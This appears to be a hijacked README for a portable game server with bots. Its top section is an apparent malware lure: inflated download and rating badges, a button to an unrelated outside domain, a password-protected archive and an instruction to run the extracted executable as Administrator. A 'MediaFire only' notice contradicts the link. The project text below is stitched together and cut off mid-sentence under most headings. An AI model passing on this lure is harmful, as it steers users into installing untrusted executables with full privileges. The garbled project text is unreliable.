<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Highlights

- **Earned progression:** players and bots unlock content through their own
  milestones, and experience follows each character's era. Bots start at level
  1 with ordinary starter equipment and earn levels, gold and upgrades. See
## Quick start

1. Download the server ZIP and the EraTalents client pack from
## Requirements

- **Server:** Windows 10/11 x64, a writable server folder and Internet access
  for the first-run server data download and automatic updates. CPU, memory and
  storage needs grow with the bot population: the default target is 2,500 bots
  while a real player is connected. Lower `Playerbots.MinRandomBots` and
  `Playerbots.MaxRandomBots` to fit the host; see
## Running the server

`startup.exe` runs MySQL, authserver and worldserver in one console and restarts
any of them that exits, including after the console's `server shutdown`
command. Press **Ctrl+C** in that console to stop the realm.

Each start checks Latest; for a newer release the launcher downloads the
changed server files, verifies them and restarts with them. SQL migrations and
new configuration defaults apply automatically; characters, databases, server
data, custom settings and the realm mode are preserved. Client packages are
installed manually: update the EraTalents client pack with the server, and the
optional addons from their forks' Latest releases. See the
## Configuration

Edit the active files in `configs/` and `configs/modules/` with the realm
stopped. Updates keep custom values; see the
## Troubleshooting

**Windows blocks `startup.exe`.** The executables are unsigned, so SmartScreen
or Smart App Control can block them. Verify the ZIP against
## Status and limitations

The release workflow runs launcher tests, source fixtures for the earned-play
rules and package verification before publishing. These checks do not establish
complete in-game coverage: full dungeon and raid runs, every class quest, the
2,500-bot target and parts of the DragonUI, Questie and Zygor integrations have
## Documentation

| Guide | Topics |
| --- | --- |
| **Players** | |
## License and credits

The portable project was originally created by **Onur Aslan** as


---

# Contributing

## Reporting problems

Report problems through
## Documentation and releases

Documentation describes the current product. Keep the README focused on
downloads, setup, features and useful limits, and put configuration and
technical details in the linked guides. The server ZIP contains `README.md`,
`THIRD_PARTY_NOTICES.md` and `docs/` without `building.md` and the upstream
proposals in `docs/upstream/`, so those files link to them and this guide by
their GitHub URLs; the documentation check in the gameplay fixtures enforces
this.


---

MIT License

Copyright (c) 2026 Onur Aslan

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
